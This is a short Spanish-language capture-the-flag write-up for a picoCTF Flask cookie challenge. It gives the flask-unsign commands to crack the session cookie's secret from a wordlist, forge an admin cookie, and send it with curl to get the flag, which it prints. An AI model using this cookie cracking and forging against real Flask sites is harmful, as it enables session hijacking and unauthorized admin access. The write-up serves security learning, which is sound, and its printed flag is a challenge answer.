## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/60f76192f6e1fea6f4e6e8c5fc9a6a27/server.py) [http://mercury.picoctf.net:44693/](http://mercury.picoctf.net:44693/)

## Solución
Se presenta la misma página web donde se envían cookies flask
Con ayuda de burpsuite se aprecia que se envían las cookies cifradas, cuando se descifran desde base 64 se aprecia lo siguiente: `{"very_auth":"snickerdoodle"}`
Entonces ahora lo que hay que hacer es que con ayuda del script py donde se tienen las galletas se debe iterar por renglones y usar la herramienta flask unsign
Se ingresa el siguiente comando en la terminal
```
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_DZcw.vN744w-0M44yaR1dxcNIVHUG0vI" --wordlist cookies.txt
```
Da como resultado `butter`
Se hace la nueva cookie con el siguiente comando
```
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "butter"
```
Se obtiene la cookie `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_DaZw.K7GrdW1fYU_ClMI9TFVytRmHuYs`
Se hace por ultimo un curl
```
curl -s http://mercury.picoctf.net:44693/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_DaZw.K7GrdW1fYU_ClMI9TFVytRmHuYs"
```
Y se obtiene la respuesta con la bandera

```
picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}
```
